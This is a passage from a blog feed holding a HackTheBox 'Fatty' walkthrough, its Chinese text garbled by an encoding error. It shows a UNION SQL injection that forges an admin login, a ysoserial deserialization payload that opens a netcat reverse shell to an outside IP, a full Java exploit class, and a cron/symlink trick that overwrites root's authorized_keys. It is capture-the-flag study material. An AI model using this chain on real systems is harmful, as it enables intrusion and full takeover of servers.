class="keyword">return</span> newUser;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FattyDbSession.LoginException(<span class="string">"Wrong Password!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FattyDbSession.LoginException(<span class="string">"Wrong Username!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var11) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logger.logError(<span class="string">"[-] Failure with SQL query: ==&gt; SELECT id,username,email,password,role FROM users WHERE username='"</span> + user.getUsername() + <span class="string">"' &lt;=="</span>);</span><br><span class="line">        <span class="keyword">this</span>.logger.logError(<span class="string">"[-] Exception was: '"</span> + var11.getMessage() + <span class="string">"'"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾ã€‚ç™»å½•çš„ä½ç½®å­˜åœ¨sqlæ³¨å…¥ã€‚å…·ä½“æµç¨‹æ˜¯ï¼šæ‰§è¡ŒsqlæŸ¥è¯¢,ç”¨æŸ¥è¯¢ç»“æœæ¥å®ä¾‹åŒ–Userç±»ã€‚å¹¶ä¸”è°ƒç”¨äº†ä¸€ä¸ªé’ˆå¯¹passwordçš„æ£€æŸ¥<code>newUser.getPassword().equalsIgnoreCase(user.getPassword()</code></p><p>è¿™ä¹Ÿå°±ä»£è¡¨ç®€å•çš„ä¸‡èƒ½å¯†ç ä¸èµ·ä½œç”¨äº†ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹çœ‹Userç±»å¦‚ä½•å®ä¾‹åŒ–çš„ã€‚ç›´æ¥æ‰¾æ„é€ æ–¹æ³•<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¦‚æœæ˜¯æˆ‘ä»¬ä¹‹å‰é‚£æ ·ã€‚ç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ªå«username,passwordçš„Userå¯¹è±¡ã€‚å®ƒä¼šæ£€æŸ¥ä¸€ä¸ªåˆå§‹åŒ–ä¸­hashçš„å€¼æ˜¯å¦ä¸ºfalse.å¦‚æœä¸ä¸ºfalseã€‚é‚£ä¹ˆä¼šåƒä¸Šé¢çš„æ„é€ æ–¹æ³•ä¸€æ ·å°†<code>sha256(username+password+&#39;clarabibimakeseverythingsecure&#39;)</code>è¿›è¡Œæ¯”å¯¹ã€‚<br>æ‰€ä»¥å¦‚æœæˆ‘ä»¬ä½¿ç”¨<code>&#39; or &#39;1&#39;=&#39;1</code>.é‚£ä¹ˆsqlè¯­å¥è¿”å›ç»“æœè‡ªç„¶æ˜¯qtcçš„æ•°æ®ã€‚ä½†æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha256(&quot;&#39; or &#39;1&#39;&#x3D;&#39;1&quot; + &quot;&#39; or &#39;1&#39;&#x3D;&#39;1&quot; + &quot;clarabibimakeseverythingsecure&quot;) &#x3D; sha256(&quot;qtc&quot;+&quot;clarabibi&quot;+&quot;clarabibimakeseverythingsecure&quot;)</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸æˆç«‹çš„ã€‚æ‰€ä»¥æˆ‘ä»¬æ— æ³•ç™»é™†ã€‚</p><p>ä½†æ˜¯ä¸è¦ç´§ã€‚æˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªsqlè¯­å¥é‡Œä½¿ç”¨unionæŸ¥è¯¢è¿”å›ä¸€ä¸ªadminç”¨æˆ·ã€‚å› ä¸ºå®ƒæ˜¯æ ¹æ®æŸ¥è¯¢ç»“æœè¿”å›æ•°æ®æ¥å®ä¾‹åŒ–Userç±»è¿›è€Œåˆ¤æ–­roleæ˜¯å¦ä¸ºadminçš„ã€‚æˆ‘ä»¬åªéœ€è¦</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User user=<span class="keyword">new</span> User(<span class="string">" abc' UNION SELECT 1,'byc_404','a@b.com','byc_404','admin"</span>,<span class="string">"byc_404"</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¿è¯Userç±»hashå€¼ä¸ºfalseã€‚è¿™æ ·passwordä¸ä¼šè¿›è¡Œsha256èµ‹å€¼ã€‚ç„¶åç”±äºabcç”¨æˆ·ä¸å­˜åœ¨ã€‚æˆ‘ä»¬unionæŸ¥è¯¢è¿”å›çš„å€¼å³</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,'byc_404','a@b.com','byc_404','admin'</span><br></pre></td></tr></table></figure><p>ç”¨æˆ·roleå·²ç»è¢«è®¾ä¸ºadminäº†.<br>æ­¤æ—¶passwordä¸passwordç›¸åŒã€‚æ ¡éªŒé€šè¿‡</p><p>æˆ‘ä»¬æ›´æ”¹ä¸‹expä¸­userå®ä¾‹åŒ–çš„æ–¹æ³•ã€‚å¹¶ä¸”å°è¯•è°ƒç”¨adminæƒé™çš„ipconfig<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æˆåŠŸæ‰§è¡Œã€‚æ­¤å¤„è¿˜å¯ä»¥ä»ipconfigä¸­172.28çœ‹å‡ºæ¥javaè¿è¡Œçš„é¶æœºä¼¼ä¹æ˜¯dockerã€‚</p><p>ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥å°è¯•changePWè¿›è¡Œååºåˆ—åŒ–äº†ã€‚ä¸è¿‡åŒæ ·ç”±äºåŸå§‹changePWæ–¹æ³•åªä¼ é€’ä¸€ä¸ªåŒå‚æ•°Userå¯¹è±¡ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜å¾—é‡å†™changePWæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">changePW</span><span class="params">(String payload)</span> <span class="keyword">throws</span> MessageParseException, MessageBuildException, IOException </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.action=<span class="keyword">new</span> ActionMessage(<span class="keyword">this</span>.sessionID,<span class="string">"changePW"</span>);</span><br><span class="line"><span class="keyword">this</span>.action.addArgument(payload);</span><br><span class="line"><span class="keyword">this</span>.sendAndRecv();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ›´æ”¹Invokeræºç å,ç„¶åå°±æ˜¯æŒ‰ç…§ä¸Šé¢çš„æµç¨‹é‡æ–°build jaråŒ…äº†ã€‚</p><p>é‡æ–°å¯¼å…¥åä½¿ç”¨ysoserialç”Ÿæˆpayload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 <span class="string">'nc 10.10.14.25 9001 -e /bin/sh'</span> |base64 -w 0</span><br></pre></td></tr></table></figure><p>(dockeré¶æœºæ²¡æœ‰bashâ€¦alpineé¶æœºé€šç—…ã€‚æ‰€å¹¸æœ‰è€ç‰ˆæœ¬nc)</p><p>æœ€ç»ˆçš„exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> htb.fatty.client.connection.Connection;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.client.methods.Invoker;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.message.MessageBuildException;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.message.MessageParseException;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.resources.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  IOException</span>&#123;</span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn = Connection.getConnection();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"[-] connection failed: "</span>+ e.getMessage());</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[+] Successfully connected"</span>);</span><br><span class="line"></span><br><span class="line">        User user=<span class="keyword">new</span> User(<span class="string">" abc' UNION SELECT 1,'byc_404','a@b.com','byc_404','admin"</span>,<span class="string">"byc_404"</span>,<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn.login(user))&#123;</span><br><span class="line">            System.out.println(<span class="string">"[+] Successfully logged in"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"[-] Login failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String rolename=conn.getRoleName();</span><br><span class="line">        user.setRoleByName(rolename);</span><br><span class="line">        System.out.println(<span class="string">"[+] rolename is: "</span>+rolename);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Invoker invoker =<span class="keyword">new</span> Invoker(conn,user);</span><br><span class="line">        String response=<span class="string">""</span>;</span><br><span class="line">        String payload=<span class="string">"rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAHm5jIDEwLjEwLjE0LjI1IDkwMDEgLWUgL2Jpbi9zaHQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg="</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            response=invoker.changePW(payload);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MessageParseException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MessageBuildException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Server response:\n"</span>+ response);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥åˆ°å›æ˜¾åä½¿ç”¨<code>ash -i 2&gt;&amp;1</code>å‡çº§tty.(æ²¡æœ‰python,socatã€‚ä½†æ˜¯å¯ä»¥ç”¨ash)<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>user qtc done.</p><p>å°ç»“ä¸‹,è¿™ä¸ªéƒ¨åˆ†çœŸå¿ƒå›°éš¾ã€‚å‡å¦‚æˆ‘æ²¡æœ‰çœ‹wpçš„è¯ä¼°è®¡æ—©å°±åœ¨ä¸­é—´æŸä¸ªç¯èŠ‚æ”¾å¼ƒäº†ã€‚ä½†æ˜¯æ•´ä½“æµç¨‹ä¸‹æ¥å…³äºjavaçš„ä¸€äº›æ“ä½œè®©æˆ‘å—ç›ŠåŒªæµ…ã€‚å°¤å…¶æ˜¯jaråŒ…çš„éƒ¨åˆ†ã€‚å½“ç„¶æˆ‘ä¹Ÿå¸Œæœ›èƒ½æ‰¾åˆ°é‡å†™jaråŒ…ä»£ç çš„æœ€ä½³æ–¹æ¡ˆã€‚</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>æ¥ä¸‹æ¥çš„éƒ¨åˆ†å°±æ¯”è¾ƒç®€å•äº†ã€‚åˆšåˆšæˆ‘ä»¬åœ¨start.shä¸­çœ‹åˆ°æ‰§è¡Œçš„å‘½ä»¤é™¤äº†jarä»¥å¤–è¿˜æœ‰cronçš„å®šæ—¶ä»»åŠ¡ã€‚æŸ¥çœ‹ä¸‹æ–‡ä»¶å‘ç°å­˜åœ¨/etc/crontabs.backã€‚å…¶ä¸­å­˜åœ¨å¤‡ä»½çš„cronjobæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 * * * * /bin/tar -cf /opt/fatty/tar/logs.tar /opt/fatty/logs/</span><br></pre></td></tr></table></figure><p>å®ƒåœ¨å®šæ—¶åœ°å°†<code>/opt/fatty/logs/</code> ä¸‹çš„å†…å®¹æ‰“åŒ…åˆ°<code>/opt/fatty/tar/logs.tar</code><br>æ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬çœ‹çœ‹é¶æœºåˆ°åº•å¯¹taræ–‡ä»¶åšäº†ä»€ä¹ˆ</p><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¯ä»¥çœ‹åˆ°ã€‚fattyæœ¬æœºåœ¨æ¯éš”ä¸€åˆ†é’Ÿä½¿ç”¨scpåŒæ­¥æ–‡ä»¶ã€‚é‚£ä¹ˆå‡å¦‚å®ƒæ˜¯rootç”¨æˆ·åœ¨æœ¬æœºè°ƒç”¨scpå¹¶ä¸”æ‰§è¡Œè§£åŒ…æ“ä½œã€‚æˆ‘ä»¬å°±æœ‰åŠæ³•è¿›è¡Œææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /root/.ssh/authorized_keys out/logs.tar</span><br><span class="line">tar -cf logs.tar -C out/ logs.tar </span><br><span class="line">tar -tvf logs.tar</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæŒ‡å‘rootå…¬é’¥çš„è½¯é“¾æ¥ã€‚å¹¶ä¸”æ‰“åŒ…å®ƒè‡ªå·±ã€‚<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¯çœ‹åˆ°æ­¤æ—¶logs.taré‡Œçš„å†…å®¹æ˜¯ä¸€ä¸ªæŒ‡å‘root sshå…¬é’¥çš„è½¯é“¾æ¥ã€‚å‡å¦‚æˆ‘ä»¬è§£å‹å®ƒçš„è¯,å°†å¾—åˆ°å®ƒæœ¬èº«ã€‚<br>æ¥ä¸‹æ¥æˆ‘ä»¬æŠŠå®ƒç§»åŠ¨åˆ°<code>/opt/fatty/tar/logs.tar</code>.é‚£ä¹ˆæ­¤æ—¶å®šæ—¶ä»»åŠ¡æŒ‡æ‰§è¡Œçš„è¯,å°†æŠŠå®ƒè½¬ç§»åˆ°æœ¬æœºã€‚å¹¶ä¸”è§£åŒ…ï¼Œä»è€Œå¾—åˆ°ä¸€ä¸ªlogs.taræ–‡ä»¶,å¹¶ä¸”å®ƒæ˜¯ä¸€ä¸ªæŒ‡å‘å…¬é’¥çš„è½¯é“¾æ¥ã€‚</p><p>æ¥ä¸‹æ¥ã€‚å‡å¦‚æˆ‘ä»¬æŠŠdockerä¸Šçš„logs.taræ¢æˆä¸€ä¸ªåŒ…å«æˆ‘ä»¬sshå…¬é’¥çš„æ–‡ä»¶ã€‚é‚£ä¹ˆå½“cronjobå†æ¬¡æ‰§è¡Œæ—¶,scpä¼šæŠŠæ–°çš„logs.tar è¦†ç›–æ—§çš„ã€‚è€Œæ—§çš„logs.taræ˜¯ä¸€ä¸ªæŒ‡å‘sshå…¬é’¥çš„è½¯é“¾æ¥</p><p>è¿™æ ·çš„è¯æ€è·¯å°±éå¸¸æ¸…æ¥šäº†ã€‚åœ¨ä¸Šé¢æ‰§è¡Œå®Œlogs.taråæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp logs.tar &#x2F;opt&#x2F;fatty&#x2F;tar&#x2F;logs.tar </span><br><span class="line"></span><br><span class="line">sleep 60</span><br><span class="line"></span><br><span class="line">echo -n &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCaTnVHUaEL07CrQQoNh1zhTfnl5m6OGd4HPwmutz2ZkEf5fWSXrtMyrlxvNP5mtinS8vlRgEtF4KAsXkFceq4Ga&#x2F;ahgcYTdcKNFJQiBDz3cC1gu4az4mfdSYGIYav0UAiUel5lWN8SJ8FLUEd1hK85dIMOFLZoKNCO1gm1zOMQFB6A+WVUbchPhLm718YMkAawCHXzxhBEwJuQ1Il7wGWyZaPzuCTR+Dgci4xZDVr7459hfQJpGz7ZmTb9msnlk3Vnd156WnbR95qMkHPlaA0DMKPvs&#x2F;GjBf2dCREGdfZloTDo6yf&#x2F;b3Ev9d4n4EiF53nc38jlxLARckbAZwA15DwS15WbOS31ZV&#x2F;ZOi3YtKSkmA7nMRYoE0QZ5uhRMZySB1FfxtHOkZV+EnXD4WPeZwG23sIpQ3AYjlbuOiybnrK5iuKcf8uclLsvf7ToahPDhZSot2bH8gnS20mcC&#x2F;sb+uLrkdI85Qn8oCe7OoLeF&#x2F;QxESa&#x2F;lIMalSvml6dSvR8ORNk&#x3D; root@byc404&#39; &gt; &#x2F;opt&#x2F;fatty&#x2F;tar&#x2F;logs.tar</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/12.PNG" class="lazyload" data-srcset="12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>rooted.</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  fatty ä½œä¸ºinsaneéš¾åº¦çš„é¶æœºç¡®å®â€å®è‡³åå½’â€ã€‚javaç›¸å…³çš„çŸ¥è¯†ææ€•èƒ½åœ¨ä¸€å¼€å§‹å°±åŠé€€å¾ˆå¤šäººäº†ã€‚ä¸è¿‡å¹¸å¥½è‡ªå·±ä¹‹å‰å­¦ä¹ äº†java webçš„ä¸€äº›åŸºç¡€çŸ¥è¯†,åœ¨è¿™é‡Œçš„å®é™…åœºæ™¯æ‰èƒ½å‘æŒ¥ä½œç”¨ã€‚ä¸€æ¬¡æ¸—é€èƒ½å­¦åˆ°å¾ˆå¤šçŸ¥è¯†ï¼Œç¡®å®å€¼å¾—ç‚¹èµã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp-vuln</title>
      <link href="2020/08/05/Thinkphp-vuln/"/>
      <url>2020/08/05/Thinkphp-vuln/</url>
      
